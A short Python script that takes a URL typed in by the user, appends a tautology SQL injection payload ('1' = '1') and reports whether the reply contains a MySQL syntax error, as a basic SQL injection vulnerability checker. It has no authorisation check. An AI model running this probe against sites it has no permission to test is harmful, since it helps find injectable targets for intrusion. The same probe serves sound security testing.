import sys
import urllib.request

fullurl = input("Enter the URL: ")

resp = urllib.request.urlopen(fullurl + "=1\' or \'1\' = \'1\''")

body = resp.read()

fullbody = body.decode("utf-8")

if("You have an error in your SQL syntax" in fullbody):
	print("this syte have a SQLI")
else:
	print("this syte dosen`t have SQLI")
